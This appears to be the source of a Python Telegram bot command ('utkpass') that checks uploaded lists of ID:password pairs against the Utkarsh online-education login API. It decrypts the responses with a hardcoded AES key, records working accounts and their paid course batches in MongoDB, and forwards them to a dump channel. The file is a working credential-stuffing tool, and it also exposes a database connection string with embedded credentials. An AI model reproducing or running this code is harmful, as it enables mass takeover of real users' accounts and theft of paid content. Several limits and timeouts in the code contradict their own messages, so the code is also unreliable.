import aiohttp
import asyncio
import datetime
import re
import logging
import aiofiles
import os
import json
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from base64 import b64decode
from pyrogram import filters
from pyrogram.errors import FloodWait, RPCError, ChatAdminRequired
from config import CHANNEL_ID
import uuid
from time import time
import pymongo
from pymongo.errors import ConnectionFailure
from pathlib import Path
import hashlib
import shutil
from charset_normalizer import detect
from typing import List, Tuple, Optional

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    logging.warning("psutil module not found. Memory monitoring disabled.")
    PSUTIL_AVAILABLE = False

try:
    from Extractor import app
except ImportError as e:
    logging.error(f"Failed to import Extractor: {e}. Ensure Extractor.py exists and defines 'app'.")
    raise ImportError("Cannot start bot: Extractor module not found. Check Extractor.py and its dependencies.")
except AttributeError as e:
    logging.error(f"Extractor module does not define 'app': {e}")
    raise AttributeError("Extractor module must define 'app' as a Pyrogram Client instance.")

# MongoDB configuration
MONGO_URI = os.environ.get("mongodb+srv://ankitshakya:ankitshakya@cluster0.cupu9yp.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0")
DB_NAME = "extractor_db"
COLLECTION_NAME = "credentials"

try:
    mongo_client = pymongo.MongoClient(MONGO_URI, serverSelectionTimeoutMS=5000)
    mongo_client.admin.command('ping')  # Test connection
    db = mongo_client[DB_NAME]
    collection = db[COLLECTION_NAME]
    logging.info("Connected to MongoDB successfully.")
except ConnectionFailure as e:
    logging.error(f"Failed to connect to MongoDB: {e}")
    raise ConnectionFailure("Cannot connect to MongoDB. Check MONGO_URI and network.")

# Logging setup
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Bot configuration
appname = "Utkarsh"
txt_dump = CHANNEL_ID
message_lock = asyncio.Lock()
TEMP_DIR = Path("temp_files")
TEMP_DIR.mkdir(exist_ok=True)
CONCURRENT_LIMIT = 5  # Maximum concurrent API requests

class RateLimiter:
    def __init__(self, max_requests, period):
        self.max_requests = max_requests
        self.period = period
        self.requests = []
        self.lock = asyncio.Lock()
    
    async def acquire(self):
        async with self.lock:
            while len(self.requests) >= self.max_requests:
                if self.requests and time() - self.requests[0] > self.period:
                    self.requests.pop(0)
                else:
                    await asyncio.sleep(0.1)
            self.requests.append(time())
    
    async def cleanup(self):
        async with self.lock:
            current = time()
            self.requests = [t for t in self.requests if current - t < self.period]

def decrypt(enc):
    try:
        enc = b64decode(enc)
        key = r'%!$!%_$&!%F)&^!^'.encode('utf-8')
        iv = r'#*y*#2yJ*#$wJv*v'.encode('utf-8')
        cipher = AES.new(key, AES.MODE_CBC, iv)
        plaintext = unpad(cipher.decrypt(enc), AES.block_size)
        return plaintext.decode('utf-8')
    except Exception:
        return None

async def safe_send_message(chat_id, text, client):
    async with message_lock:
        for attempt in range(3):
            try:
                return await client.send_message(chat_id, text)
            except FloodWait as e:
                logger.warning(f"FloodWait: Sleeping for {e.value} seconds")
                await asyncio.sleep(e.value)
            except ChatAdminRequired as e:
                logger.error(f"ChatAdminRequired: {e}")
                return None
            except RPCError as e:
                logger.error(f"RPCError: {e}")
                if "Connection is closed" in str(e):
                    await asyncio.sleep(2 ** attempt)
                else:
                    raise
        logger.error(f"Failed to send message to {chat_id} after retries")
        return None

async def safe_edit_message(message, text, client):
    async with message_lock:
        for attempt in range(3):
            try:
                return await message.edit(text)
            except FloodWait as e:
                logger.warning(f"FloodWait: Sleeping for {e.value} seconds")
                await asyncio.sleep(e.value)
            except ChatAdminRequired as e:
                logger.error(f"ChatAdminRequired: {e}")
                return None
            except RPCError as e:
                logger.error(f"RPCError: {e}")
                if "Connection is closed" in str(e):
                    await asyncio.sleep(2 ** attempt)
                else:
                    raise
        logger.error("Failed to edit message after retries")
        return None

async def fetch_api(session, url, headers, data=None, method='POST', retries=3, rate_limiter=None, semaphore=None):
    async with semaphore:
        for attempt in range(retries):
            if rate_limiter:
                await rate_limiter.acquire()
            try:
                async with asyncio.timeout(30):
                    if method == 'POST':
                        async with session.post(url, headers=headers, data=data) as response:
                            response.raise_for_status()
                            text = await response.text()
                            try:
                                return json.loads(text)
                            except json.JSONDecodeError:
                                logger.error(f"Non-JSON response from {url}: Response (first 500 chars): {text[:500]}")
                                return None
                    else:
                        async with session.get(url, headers=headers) as response:
                            response.raise_for_status()
                            text = await response.text()
                            try:
                                return json.loads(text)
                            except json.JSONDecodeError:
                                logger.error(f"Non-JSON response from {url}: Response (first 500 chars): {text[:500]}")
                                return None
            except asyncio.TimeoutError:
                logger.error(f"API request timed out (attempt {attempt + 1}/{retries}): {url}")
                if attempt < retries - 1:
                    await asyncio.sleep(2 ** attempt)
                else:
                    return None
            except aiohttp.ClientError as e:
                logger.error(f"API request failed (attempt {attempt + 1}/{retries}): {e}")
                if attempt < retries - 1:
                    await asyncio.sleep(2 ** attempt)
                else:
                    return None
            finally:
                if rate_limiter:
                    await rate_limiter.cleanup()
    return None

async def log_memory():
    if not PSUTIL_AVAILABLE:
        logger.debug("Memory logging skipped: psutil not available")
        return
    try:
        process = psutil.Process()
        mem = process.memory_info().rss / 1024 / 1024
        logger.info(f"Memory usage: {mem:.2f} MB")
    except Exception as e:
        logger.error(f"Failed to log memory: {e}")

async def fetch_batches(session, token, headers, rate_limiter, semaphore):
    data2 = f"type=Batch&csrf_name={token}&sort=0"
    res2 = await fetch_api(session, 'https://online.utkarsh.com/web/Profile/my_course', headers, data2, rate_limiter=rate_limiter, semaphore=semaphore)
    if not res2:
        return None
    res2_data = res2.get("response", "").replace('MDE2MTA4NjQxMDI3NDUxNQ==', '==').replace(':', '==')
    decrypted_res = decrypt(res2_data)
    if not decrypted_res:
        return None
    try:
        dc = json.loads(decrypted_res)
        return dc.get('data', {}).get("data", [])
    except json.JSONDecodeError as e:
        logger.error(f"JSON decode error in course response: {e}")
        return None

async def fallback_download(client, file_id, file_path):
    try:
        async with asyncio.timeout(120):
            await client.download_media(file_id, file_path)
            if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
                logger.info(f"Fallback download successful: {file_path}, Size: {os.path.getsize(file_path)} bytes")
                return True
            else:
                raise FileNotFoundError(f"Fallback download failed: File missing or empty: {file_path}")
    except Exception as e:
        logger.error(f"Fallback download failed for File ID {file_id}: {e}")
        return False

async def check_disk_space(required_bytes):
    total, used, free = shutil.disk_usage(TEMP_DIR)
    return free > required_bytes

async def compute_sha256(file_path):
    sha256 = hashlib.sha256()
    async with aiofiles.open(file_path, 'rb') as f:
        while chunk := await f.read(8192):
            sha256.update(chunk)
    return sha256.hexdigest()

async def download_file_with_fallback(client, file_id, file_path, file_size):
    try:
        async with asyncio.timeout(max(120, file_size // (100 * 1024))):
            await client.download_media(file_id, file_path)
            if Path(file_path).exists() and Path(file_path).stat().st_size > 0:
                computed_hash = await compute_sha256(file_path)
                logger.info(f"File downloaded: {file_path}, Size: {Path(file_path).stat().st_size} bytes, SHA-256: {computed_hash}")
                return True
            else:
                raise FileNotFoundError(f"Downloaded file is missing or empty: {file_path}")
    except Exception as e:
        logger.error(f"Primary download failed for File ID {file_id}: {e}")
        return await fallback_download(client, file_id, file_path)

async def process_credential(
    session: aiohttp.ClientSession,
    index: int,
    ids: str,
    ps: str,
    token: str,
    headers: dict,
    user_id: int,
    rate_limiter: RateLimiter,
    semaphore: asyncio.Semaphore,
    valid_entries: List[dict],
    invalid_entries: List[str],
    valid_count: List[int],
    invalid_count: List[int],
    client,
    chat_id: int
) -> None:
    credential = f"{ids}*{ps}"
    mongo_doc = {
        "user_id": user_id,
        "credential": credential,
        "timestamp": datetime.datetime.utcnow(),
        "processed_by": appname
    }

    # Login attempt
    data = f"csrf_name={token}&mobile={ids}&url=0&password={ps}&submit=LogIn&device_token=null"
    log_response = await fetch_api(session, 'https://online.utkarsh.com/web/Auth/login', headers, data, rate_limiter=rate_limiter, semaphore=semaphore)

    if not log_response:
        invalid_count[0] += 1
        invalid_entries.append(f"{credential} - Failed to connect to server")
        logger.info(f"Skipping MongoDB save for invalid credential: {credential} (Failed to connect to server)")
        return

    log_data = log_response.get("response", "").replace('MDE2MTA4NjQxMDI3NDUxNQ==', '==').replace(':', '==')
    dec_log = decrypt(log_data)
    if not dec_log:
        invalid_count[0] += 1
        invalid_entries.append(f"{credential} - Failed to decrypt login response")
        logger.info(f"Skipping MongoDB save for invalid credential: {credential} (Failed to decrypt login response)")
        return

    try:
        dec_logs = json.loads(dec_log)
    except json.JSONDecodeError:
        invalid_count[0] += 1
        invalid_entries.append(f"{credential} - Invalid login response format")
        logger.info(f"Skipping MongoDB save for invalid credential: {credential} (Invalid login response format)")
        return

    status = dec_logs.get('status', False)
    if not status:
        invalid_count[0] += 1
        error_message = dec_logs.get('message', 'No message')
        invalid_entries.append(f"{credential} - Login failed: {error_message}")
        logger.info(f"Skipping MongoDB save for invalid credential: {credential} (Login failed: {error_message})")
        return

    # Fetch batches
    bdetail = await fetch_batches(session, token, headers, rate_limiter, semaphore)
    if not bdetail:
        invalid_count[0] += 1
        invalid_entries.append(f"{credential} - No batches found")
        logger.info(f"Skipping MongoDB save for invalid credential: {credential} (No batches found)")
        return

    # Valid credential: collect batches and send message
    valid_count[0] += 1
    batches = []
    message_lines = [credential]
    for item in bdetail:
        batch_id = item.get("id", "N/A")
        batch_name = item.get("title", "N/A")
        batches.append((batch_id, batch_name))
        message_lines.append(f"{batch_id} {batch_name}")
        mongo_doc.update({
            "status": "valid",
            "batch_id": batch_id,
            "batch_name": batch_name,
            "error_message": None
        })
        try:
            collection.insert_one(mongo_doc.copy())
            logger.info(f"Saved valid credential to MongoDB: {credential}, Batch: {batch_id}")
        except Exception as e:
            logger.warning(f"Failed to save to MongoDB for {credential}: {e}")

    # Store credential with its batches
    valid_entries.append({
        "credential": credential,
        "batches": batches
    })

    # Send message for this credential
    message_text = "\n".join(message_lines)
    sent_message = await safe_send_message(chat_id, message_text, client)
    if not sent_message:
        logger.warning(f"Failed to send message for credential: {credential}")
    else:
        logger.info(f"Sent message for valid credential: {credential}")

@app.on_message(filters.command(["utkpass"]))
async def handle_utkpass(client, m):
    user_id = m.from_user.id
    chat_id = m.chat.id
    rate_limiter = RateLimiter(max_requests=3, period=1)
    semaphore = asyncio.Semaphore(CONCURRENT_LIMIT)
    async with aiohttp.ClientSession() as session:
        await log_memory()
        try:
            async with asyncio.timeout(600000000000):
                # Prompt user to send the text file
                editable = await safe_send_message(
                    chat_id,
                    "Please send a .txt file containing ID:password or ID*password pairs, one per line (max 10MB, UTF-8 encoding preferred).",
                    client
                )
                if not editable:
                    return
                input_file = await client.listen(chat_id=chat_id, filters=filters.document)
                if not input_file.document:
                    await safe_edit_message(editable, "Error: Please send a valid text file.", client)
                    return
                file_name = input_file.document.file_name
                file_size = input_file.document.file_size
                file_id = input_file.document.file_id
                logger.info(f"Received file: {file_name}, Size: {file_size} bytes, File ID: {file_id}")
                if not file_name.lower().endswith('.txt'):
                    await safe_edit_message(editable, "Error: File must be a .txt file.", client)
                    return
                if file_size > 10 * 1024 * 1024:
                    await safe_edit_message(editable, "Error: File size exceeds 10MB limit.", client)
                    return
                if not await check_disk_space(file_size * 2):
                    await safe_edit_message(editable, "Error: Insufficient disk space to process the file.", client)
                    return

                # Download the file
                file_path = TEMP_DIR / f"input_{user_id}_{uuid.uuid4()}.txt"
                download_success = False
                for attempt in range(3):
                    download_success = await download_file_with_fallback(client, file_id, str(file_path), file_size)
                    if download_success:
                        break
                    logger.warning(f"Download attempt {attempt + 1}/3 failed for File ID {file_id}")
                    if attempt < 2:
                        await asyncio.sleep(2 ** attempt)
                if not download_success:
                    await safe_edit_message(editable, f"Error: Failed to download file after retries (File ID: {file_id}). Please try uploading again.", client)
                    return

                # Detect file encoding
                try:
                    async with aiofiles.open(file_path, 'rb') as f:
                        raw_data = await f.read(1024 * 1024)
                    encoding_info = detect(raw_data)
                    encoding = encoding_info.get('encoding', 'utf-8')
                    if encoding not in ['utf-8', 'ascii']:
                        await safe_edit_message(editable, f"Error: Unsupported file encoding ({encoding}). Please use UTF-8.", client)
                        return
                    logger.info(f"Detected file encoding: {encoding}")
                except Exception as e:
                    logger.error(f"Failed to detect encoding for {file_path}: {e}")
                    await safe_edit_message(editable, "Error: Could not detect file encoding. Please ensure the file is valid.", client)
                    return

                # Read the input file line-by-line
                credentials = []
                line_count = 0
                try:
                    async with aiofiles.open(file_path, 'r', encoding=encoding) as f:
                        async for line in f:
                            line_count += 1
                            line = line.strip()
                            if line:
                                if ':' in line:
                                    parts = line.split(':', 1)
                                    if len(parts) == 2 and all(parts):
                                        credentials.append(parts)
                                    else:
                                        logger.warning(f"Invalid line {line_count}: {line}")
                                elif '*' in line:
                                    parts = line.split('*', 1)
                                    if len(parts) == 2 and all(parts):
                                        credentials.append(parts)
                                    else:
                                        logger.warning(f"Invalid line {line_count}: {line}")
                                else:
                                    logger.warning(f"Invalid line {line_count}: {line}")
                            if len(credentials) >= 10000000000000000000000000:
                                await safe_edit_message(editable, "Error: Too many credentials (max 10,000). Please split the file.", client)
                                return
                    logger.info(f"Read {len(credentials)} credentials from {file_path} ({line_count} lines)")
                except UnicodeDecodeError:
                    logger.error(f"Encoding error reading {file_path} with {encoding}")
                    await safe_edit_message(editable, f"Error: File encoding error. Please ensure the file is UTF-8 encoded.", client)
                    return
                except Exception as e:
                    logger.error(f"Failed to read input file {file_path}: {e}")
                    await safe_edit_message(editable, f"Error reading file: {e}. Please ensure the file is a valid text file.", client)
                    return
                finally:
                    if file_path.exists():
                        try:
                            await aiofiles.os.remove(file_path)
                            logger.info(f"Input file deleted: {file_path}")
                        except Exception as e:
                            logger.warning(f"Failed to delete input file: {e}")

                if not credentials:
                    await safe_edit_message(editable, "Error: No valid ID:password or ID*password pairs found in the file.", client)
                    return

                # Initialize headers and get token
                session_id = str(uuid.uuid4()).replace('-', '')
                headers = {
                    'accept': 'application/json, text/javascript, */*; q=0.01',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                    'referer': 'https://online.utkarsh.com/',
                    'accept-encoding': 'gzip, deflate, br, zstd',
                    'accept-language': 'en-US,en;q=0.9',
                    'cookie': f'ci_session={session_id}'
                }
                token_response = await fetch_api(session, 'https://online.utkarsh.com/web/home/get_states', headers, method='GET', rate_limiter=rate_limiter, semaphore=semaphore)
                if not token_response:
                    await safe_edit_message(editable, "Error: Failed to get token from Utkarsh API.", client)
                    return
                token = token_response.get("token")
                if not token:
                    await safe_edit_message(editable, "Error: No token received from Utkarsh API.", client)
                    return

                headers.update({
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'x-requested-with': 'XMLHttpRequest',
                    'origin': 'https://online.utkarsh.com',
                    'cookie': f'csrf_name={token}; ci_session={session_id}'
                })

                # Process credentials in parallel with incremental sending
                valid_entries = []
                invalid_entries = []
                valid_count = [0]
                invalid_count = [0]
                total = len(credentials)
                processed = 0
                progress_msg = await safe_edit_message(editable, f"Processing 0/{total} credentials | Valid: 0 | Invalid: 0", client)

                # Process in chunks
                chunk_size = CONCURRENT_LIMIT * 2
                for i in range(0, len(credentials), chunk_size):
                    chunk = credentials[i:i + chunk_size]
                    tasks = [
                        process_credential(
                            session,
                            i + j + 1,
                            ids,
                            ps,
                            token,
                            headers,
                            user_id,
                            rate_limiter,
                            semaphore,
                            valid_entries,
                            invalid_entries,
                            valid_count,
                            invalid_count,
                            client,
                            chat_id
                        )
                        for j, (ids, ps) in enumerate(chunk)
                    ]
                    await asyncio.gather(*tasks, return_exceptions=True)
                    processed += len(chunk)
                    await safe_edit_message(
                        progress_msg,
                        f"Processing {processed}/{total} credentials | Valid: {valid_count[0]} | Invalid: {invalid_count[0]}",
                        client
                    )
                    await asyncio.sleep(2)  # Delay to avoid Telegram flood limits

                # Write valid credentials to output file
                output_file = TEMP_DIR / f"output_{user_id}_{uuid.uuid4()}.txt"
                try:
                    async with aiofiles.open(output_file, 'w', encoding='utf-8') as f:
                        for entry in valid_entries:
                            credential = entry["credential"]
                            batches = entry["batches"]
                            await f.write(f"{credential}\n")
                            for batch_id, batch_name in batches:
                                if batch_id != "N/A" and batch_name != "N/A":
                                    await f.write(f"{batch_id} {batch_name}\n")
                            await f.write("\n")
                except Exception as e:
                    logger.error(f"Failed to write output file {output_file}: {e}")
                    await safe_edit_message(progress_msg, f"Error writing output file: {e}", client)
                    if output_file.exists():
                        await aiofiles.os.remove(output_file)
                    return

                # Send the output file
                caption = f"Processed {total} credentials\nValid: {valid_count[0]}\nInvalid: {invalid_count[0]}"
                try:
                    await client.send_document(chat_id, output_file, caption=caption)
                    txt_dump_doc = await client.send_document(txt_dump, output_file, caption=caption)
                    if not txt_dump_doc:
                        await safe_send_message(chat_id, "Warning: Could not send file to txt_dump channel. Ensure bot is admin.", client)
                except Exception as e:
                    logger.error(f"Failed to send document {output_file}: {e}")
                    await safe_edit_message(progress_msg, f"Error sending file: {e}", client)
                finally:
                    if output_file.exists():
                        try:
                            await aiofiles.os.remove(output_file)
                            logger.info(f"Output file deleted: {output_file}")
                        except Exception as e:
                            logger.warning(f"Failed to delete output file: {e}")

                await safe_edit_message(progress_msg, f"Completed! Valid: {valid_count[0]} | Invalid: {invalid_count[0]}", client)

        except asyncio.TimeoutError:
            logger.error(f"Timeout: Processing for user {user_id} took longer than 10 minutes")
            await safe_send_message(chat_id, "Error: Processing took longer than 10 minutes. Please try again.", client)
        except Exception as e:
            logger.error(f"Unexpected error for user {user_id}: {e}")
            await safe_send_message(chat_id, f"Unexpected error occurred: {e}. Please try again.", client)
        finally:
            await log_memory()
            try:
                mongo_client.close()
                logger.info("MongoDB client closed.")
            except Exception as e:
                logger.warning(f"Failed to close MongoDB client: {e}")
            try:
                for old_file in TEMP_DIR.glob("*.txt"):
                    if old_file.stat().st_mtime < time() - 3600:
                        await aiofiles.os.remove(old_file)
                        logger.info(f"Deleted old temp file: {old_file}")
            except Exception as e:
                logger.warning(f"Failed to clean up temp files: {e}")
